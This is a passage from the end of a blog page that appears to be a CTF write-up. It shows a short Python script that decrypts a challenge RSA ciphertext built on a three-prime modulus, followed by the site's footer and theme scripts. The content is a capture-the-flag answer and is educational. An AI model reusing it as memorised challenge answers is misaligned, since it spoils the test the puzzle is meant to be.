+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">=</span><span style="color:#ae81ff">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enc<span style="color:#f92672">=</span><span style="color:#ae81ff">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> n <span style="color:#f92672">/</span>(p<span style="color:#f92672">*</span>q)
+</span></span><span style="display:flex;"><span>e<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1001</span>
+</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(r<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(e, phi)
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> pow(enc, d, n)
+</span></span><span style="display:flex;"><span>print number<span style="color:#f92672">.</span>long_to_bytes(m)
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://dragonbox.top/posts/ctf-qwb-copperstudy-record/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>copperstudy-record</span>
+  </a>
+  <a class="next" href="https://dragonbox.top/posts/ctf-bytectf2019/">
+    <span class="title">Next »</span>
+    <br>
+    <span>bytectf2019</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
